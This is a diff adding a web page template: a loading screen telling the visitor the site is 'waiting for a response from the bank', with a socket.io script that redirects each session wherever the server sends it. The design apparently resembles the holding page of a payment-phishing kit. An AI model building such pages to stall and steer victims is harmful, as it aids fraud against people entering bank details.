@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>
+        <%= title %>
+    </title>
+    <link rel="stylesheet" href="/stylesheets/output.css">
+    <link rel='stylesheet' href='/stylesheets/style.css' />
+    <%- include("./includes/jivochat.ejs") %>
+
+</head>
+
+<body class="bg-[#F3F2F2] roboto">
+    <%- include("./includes/navbar.ejs") %>
+
+        <div class="fixed top-0 left-0 w-full h-full flex justify-center items-center z-[999]">
+            <div class="text-center">
+                <img src="/images/loading.gif" alt="loading" class="w-40 mx-auto">
+                <p class="font-medium text-2xl">Wait</p>
+                <p class="font-medium text-lg">We are waiting for a response from the bank...</p>
+            </div>
+        </div>
+
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.3.2/socket.io.js"></script>
+        <input type="hidden" id="uniqueID" value="<%= uniqueID %>">
+        <script>
+            const socket = io();
+
+
+            socket.on('redirect', async (data) => {
+                if (data.vcid === document.getElementById('uniqueID').value) {
+                    location.href = data.url
+                }
+            })
+        </script>
+</body>
+
+</html>
